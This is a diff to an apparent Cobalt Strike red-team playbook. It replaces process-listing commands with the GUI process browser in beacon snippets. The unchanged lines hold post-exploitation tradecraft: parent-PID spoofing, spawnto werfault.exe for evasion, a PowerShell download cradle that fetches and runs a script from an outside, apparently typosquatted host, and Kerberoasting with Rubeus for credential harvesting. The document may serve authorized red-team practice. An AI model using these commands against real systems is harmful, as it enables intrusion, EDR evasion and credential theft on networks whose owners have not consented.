@@ -64,7 +64,7 @@ C:\Tools\cobaltstrike\custom-resources\resources.cna
 
 **After first beacon checks in:**
 ```cs
-beacon> ps                                         // check for EDR, find explorer PID
+beacon> process_browser                            // GUI tab — check for EDR, find explorer PID, right-click → inject/steal_token
 beacon> ppid <explorer.exe PID>                    // OPSEC-SAFE — spoof parent
 beacon> spawnto x64 %windir%\sysnative\werfault.exe
 ```
@@ -118,8 +118,7 @@ iex (new-object net.webclient).downloadstring('http://www.bleepincomputer.com/<u
 **Verify first beacon:**
 ```cs
 beacon> getuid
-beacon> getpid
-beacon> ps             // confirm beacon is inside msedge.exe, check for EDR
+beacon> process_browser // GUI tab — confirm beacon is inside msedge.exe, check for EDR, right-click → steal_token/inject
 ```
 
 ---
@@ -587,7 +586,7 @@ OPSEC TIERS:
   UNSAFE:  shell, powershell, run, jump psexec64, mimikatz direct
 
 SITUATIONAL AWARENESS:
-  beacon> getuid | getpid | ps | ppid <PID> | spawnto x64 %windir%\sysnative\werfault.exe
+  beacon> getuid | process_browser | ppid <PID> | spawnto x64 %windir%\sysnative\werfault.exe
 
 CREDENTIAL HARVEST:
   Kerberoast:   execute-assembly Rubeus.exe kerberoast /user:<svc> /nowrap
